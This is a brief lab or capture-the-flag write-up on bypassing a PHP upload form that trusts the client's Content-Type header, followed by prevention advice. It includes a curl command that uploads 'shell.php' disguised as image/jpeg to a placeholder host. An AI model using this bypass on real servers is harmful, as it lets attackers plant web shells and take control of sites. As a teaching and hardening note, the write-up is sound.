# Upload Content-Type Bypass

The file upload form validates only the `Content-Type` header, not the actual file content.
By uploading a non-image file (e.g. a PHP script) with `Content-Type: image/jpeg`, the server
accepts it and renders the flag.

## Exploit

```bash
curl -F "uploaded=@shell.php;type=image/jpeg" \
     -F "Upload=Upload" \
     "http://<IP>/index.php?page=upload"
```

## How to prevent

- Validate the file's actual MIME type server-side using magic bytes (e.g. `finfo_file()` in PHP)
- Never trust the `Content-Type` header supplied by the client
- Restrict allowed extensions and store uploads outside the webroot
